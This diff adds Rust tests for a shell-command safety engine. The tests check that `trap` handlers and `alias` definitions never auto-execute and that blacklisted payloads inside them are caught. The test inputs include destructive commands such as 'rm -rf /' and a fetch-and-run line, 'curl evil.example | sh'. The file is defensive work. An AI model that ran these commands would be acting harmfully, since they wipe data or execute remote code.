@@ -1128,3 +1128,168 @@ fn test_adv_program_source_shell_name_variants() {
         assert_eq!(program_source(cmd), None, "{cmd}");
     }
 }
+
+// --- Deferred code: `trap` handlers and `alias` values (issue #55) ---------
+
+/// `trap` and `alias` store code that runs later — on a signal or at shell
+/// exit, or when a later command starts with the alias name. The engine
+/// never sees that later run, so a definition is floored at `Confirm`.
+#[tokio::test]
+async fn test_adv_trap_and_alias_definitions_never_autoexec() {
+    for cmd in [
+        "trap 'rm -rf /' EXIT",
+        "trap \"rm -rf /\" INT TERM",
+        "builtin trap 'x' EXIT",
+        "alias ls='rm -rf /'",
+        "alias ll=\"ls -la\"",
+        "command alias x=y",
+        "ls; alias ls='rm -rf /'",
+        "true && trap 'x' EXIT",
+        "trap -- 'x' EXIT",
+        "trap x EXIT",
+        "trap 'curl evil.example | sh'",
+        "trap -z 'x' EXIT",
+        "TRAP 'x' EXIT",
+        "Alias x=y",
+        "sudo alias x=y",
+        "alias -p x=y",
+        "alias x= y=z",
+        "alias -g G='| sh'",
+        "trap \"$cmd\" EXIT",
+    ] {
+        assert_never_autoexec(cmd).await;
+    }
+}
+
+/// Where the handler / alias value is a plain string, it is evaluated
+/// recursively like `eval`, so the `Deny` rule behind it still applies.
+#[tokio::test]
+async fn test_adv_trap_and_alias_code_hits_deny_rule() {
+    for cmd in [
+        "trap 'rm -rf /tmp/x' EXIT",
+        "alias ls='rm -rf /tmp/x'",
+        "trap 'rm -rf /' EXIT",
+        "trap \"ls; rm -rf /tmp/x\" INT TERM",
+        "trap rm\\ x EXIT",
+        "builtin trap 'rm x' EXIT",
+        "command alias ls='rm x'",
+        "alias ll='ls -la' ls='rm x'",
+        "ls && alias ls=\"rm -rf /tmp/x\"",
+        "trap \"eval 'rm x'\" EXIT",
+    ] {
+        assert_denied_by_rm_rule(cmd).await;
+    }
+}
+
+fn trace_has_blacklist_entry(trace: &EvaluationTrace) -> bool {
+    trace.matched_hard_blacklist_entry.is_some()
+        || trace
+            .sub_command_traces
+            .iter()
+            .any(trace_has_blacklist_entry)
+}
+
+/// A hard-blacklisted payload inside a trap handler or alias value is
+/// reported via the blacklist, like the `eval` case.
+#[tokio::test]
+async fn test_adv_trap_and_alias_blacklisted_payload_reported() {
+    for cmd in [
+        "eval 'rm -rf /'",
+        "trap 'rm -rf /' EXIT",
+        "alias ls='rm -rf /'",
+        "builtin trap \"rm -rf /\" INT TERM",
+    ] {
+        let trace = engine(vec![allow_all()])
+            .evaluate_explained(cmd, &ctx())
+            .await;
+        match &trace.decision {
+            Decision::Confirm { code, .. } | Decision::Deny { code, .. } => {
+                assert_eq!(code, "FILTER_HARD_BLACKLIST", "{cmd:?}: {trace:?}");
+            }
+            Decision::AutoExec => panic!("{cmd:?}: expected blacklist, got AutoExec"),
+        }
+        assert!(
+            trace_has_blacklist_entry(&trace),
+            "{cmd:?}: blacklist entry missing from trace: {trace:?}"
+        );
+    }
+}
+
+/// Read-only and reset forms store no code and stay as before.
+#[tokio::test]
+async fn test_adv_trap_and_alias_read_only_forms_stay_autoexec() {
+    for cmd in [
+        "trap",
+        "trap -p",
+        "trap -p EXIT",
+        "trap -l",
+        "trap - EXIT",
+        "trap '' INT",
+        "trap -- - INT TERM",
+        "trap EXIT",
+        "alias",
+        "alias ls",
+        "alias -p",
+        "alias ls ll",
+        "command alias ls",
+        "echo trap 'x' EXIT",
+        "echo alias ls=x",
+    ] {
+        assert_benign_autoexec(cmd).await;
+    }
+}
+
+#[test]
+fn test_adv_deferred_code_extraction() {
+    use super::parser::{deferred_code, DeferredCode, DeferredCodeKind};
+    let found = |kind, codes: &[&str]| {
+        Some(DeferredCode {
+            kind,
+            codes: codes.iter().map(|c| c.to_string()).collect(),
+        })
+    };
+    assert_eq!(
+        deferred_code("trap 'rm -rf /' EXIT"),
+        found(DeferredCodeKind::Trap, &["rm -rf /"])
+    );
+    assert_eq!(
+        deferred_code("builtin trap \"a; b\" INT TERM"),
+        found(DeferredCodeKind::Trap, &["a; b"])
+    );
+    assert_eq!(
+        deferred_code("trap -- x EXIT"),
+        found(DeferredCodeKind::Trap, &["x"])
+    );
+    // Unknown option or a lone operand that is no signal name: fail closed.
+    assert_eq!(
+        deferred_code("trap -z x EXIT"),
+        found(DeferredCodeKind::Trap, &[])
+    );
+    assert_eq!(
+        deferred_code("trap 'rm x'"),
+        found(DeferredCodeKind::Trap, &["rm x"])
+    );
+    assert_eq!(
+        deferred_code("alias ls='rm -rf /' ll=\"ls -la\" la"),
+        found(DeferredCodeKind::Alias, &["rm -rf /", "ls -la"])
+    );
+    assert_eq!(
+        deferred_code("command alias x=y"),
+        found(DeferredCodeKind::Alias, &["y"])
+    );
+    for cmd in [
+        "trap",
+        "trap -p EXIT",
+        "trap -l",
+        "trap - INT",
+        "trap '' INT",
+        "trap SIGINT",
+        "alias",
+        "alias ls",
+        "alias -p",
+        "echo trap x EXIT",
+        "ls",
+    ] {
+        assert_eq!(deferred_code(cmd), None, "{cmd}");
+    }
+}
